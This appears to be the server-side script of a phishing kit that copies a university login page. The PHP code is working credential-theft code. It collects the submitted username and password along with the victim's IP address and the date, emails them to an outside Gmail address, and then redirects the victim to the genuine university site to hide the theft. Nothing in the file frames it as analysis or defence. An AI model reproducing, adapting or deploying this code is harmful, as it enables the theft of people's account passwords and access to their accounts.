<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="Lou";$mesaegs  =".com";
$message .= "---------=ASU=---------\n";
$message .= "UANet ID: ".$_POST['j_username']."\n";
$message .= "Password: ".$_POST['j_password']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------= Created by Jippy =---------\n";




$sent =" ro0t2scan@gmail.com";




$subject = "ASU";
$headers = "From: ASU<wire@fizzy.co.uk>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://uakron.edu/");
?>